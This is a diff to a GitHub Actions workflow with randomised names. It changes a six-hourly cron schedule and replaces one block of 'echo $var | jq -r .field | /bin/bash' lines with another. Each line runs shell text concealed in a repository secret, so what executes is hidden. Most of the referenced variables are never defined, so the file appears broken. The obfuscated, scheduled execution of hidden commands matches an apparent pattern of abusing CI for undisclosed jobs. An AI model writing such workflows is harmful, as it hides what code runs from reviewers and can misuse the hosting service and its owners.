@@ -2,7 +2,7 @@ name: xuxijiao7891
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 3/6 * * *'
+    - cron: '29 5/6 * * *'
 
 jobs:
   build:
@@ -12,16 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: xuxijiao7891
         env:
-          hlplq8242: ${{ secrets.hlplq8242 }}
+          ztg94: ${{ secrets.ztg94 }}
         run: |
-          echo $hlplq8242 | jq -r .abcqz101 | /bin/bash
-          echo $gdybz0780 | jq -r .cfyqf98906 | /bin/bash
-          echo $h823 | jq -r .gs7456 | /bin/bash
-          echo $dqq7350 | jq -r .k850 | /bin/bash
-          echo $m48 | jq -r .inx56 | /bin/bash
-          echo $ulyhp304 | jq -r .kg6 | /bin/bash
-          echo $crx187 | jq -r .jevck50735 | /bin/bash
-          echo $frpxh86088 | jq -r .f7650 | /bin/bash
-          echo $wiky4 | jq -r .fjpx910 | /bin/bash
-          echo $jxob627 | jq -r .f7 | /bin/bash
+          echo $ztg94 | jq -r .j2112 | /bin/bash
+          echo $xdu96 | jq -r .v0 | /bin/bash
+          echo $cfj48 | jq -r .kcwn58929 | /bin/bash
+          echo $sf475 | jq -r .tzbeq8 | /bin/bash
+          echo $wt4964 | jq -r .u31412 | /bin/bash
+          echo $pofi96 | jq -r .nsy48266 | /bin/bash
+          echo $fu5382 | jq -r .ajl54308 | /bin/bash
 
